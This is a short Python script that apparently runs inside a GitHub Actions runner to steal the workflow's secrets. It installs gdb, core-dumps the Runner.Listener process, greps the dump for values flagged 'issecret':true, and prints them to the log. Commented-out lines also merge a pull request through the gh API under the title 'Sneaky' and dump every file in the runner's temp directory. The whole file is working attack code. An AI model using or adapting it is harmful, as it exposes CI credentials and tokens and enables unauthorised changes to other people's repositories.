import os
import shlex
import subprocess

# print(os.environ)

# cmd = """gh api --method PUT -H "Accept: application/vnd.github+json" -H "X-GitHub-Api-Version: 2022-11-28" /repos/braingram/autofix_workaround/pulls/14/merge -f commit_title='Sneaky' -f commit_message='na'"""
# print(os.system(cmd))

# base_dir = '/home/runner/work/_temp/'
# 
# for root, dirs, filenames in os.walk(base_dir):
#     for relative_fn in filenames:
#         fn = '/'.join([root, relative_fn])
#         print(f"== {fn } ==")
#         try:
#             with open(fn, 'r') as f:
#                 print(f.read())
#         except Exception as e:
#             print(f"Error: {e}")
#         print("------\n")

cmd = "sudo apt-get install -y gdb"
print(os.system(cmd))
output = subprocess.check_output(shlex.split("ps aux"))
print("=== ps ax === ")
print(output.decode('ascii'))
print("------")
for line in output.splitlines()[1:]:
    if b'Runner.Listener' in line:
        pid = line.strip().split()[1].decode('ascii')
print(f"{pid=}")
cmd = f"sudo gcore -o k.dump {pid}"
print(os.system(cmd))
kdfn = [fn for fn in os.listdir('.') if 'k.dump' in fn][0]
print(f"{kdfn=}")
cmd = """grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' """ + kdfn
print(subprocess.check_output(shlex.split(cmd)).decode('ascii'))
